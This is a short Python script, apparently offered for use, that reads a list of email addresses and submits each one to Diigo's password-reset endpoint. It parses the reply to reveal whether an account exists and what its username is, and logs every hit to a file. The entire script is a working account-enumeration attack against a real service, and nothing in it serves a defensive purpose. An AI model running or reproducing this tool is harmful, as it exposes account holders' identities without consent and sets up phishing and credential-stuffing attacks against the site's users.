# Created by @hooshmandk - http://scriptics.ir
from urllib.request import *
from urllib.error import *
from urllib.parse import *
import re


def send(uemail):
    try:
        print("[+] Sending request...");
        params = {'username': uemail}
        data = urlencode(params).encode('utf-8')
        request = Request("https://www.diigo.com/user_mana2/forgot")
        #Send request and analyse response
        f = urlopen(request, data)
        response = f.read().decode('utf-8')
        e = re.compile('<strong>(.*?)</strong>')
        mch = e.findall(response)
        out = open("out.txt","a")
        if mch :
            print(uemail + " : " + mch[0])
            out.write(uemail + " : " + mch[0] + "\n")
        else :
            print(uemail + " : " + "No account")
            #out.write(uemail + " : " + "No account" + "\n")

        out.close()

    except Exception as e:
        print("Error: " + str(e))


print("[+] Start!");
#Send request to site
fname = 'maillist.txt'
f= open(fname);
lines = f.readlines();
for i in lines:
    send(i.strip());

print("[+] Finished!");
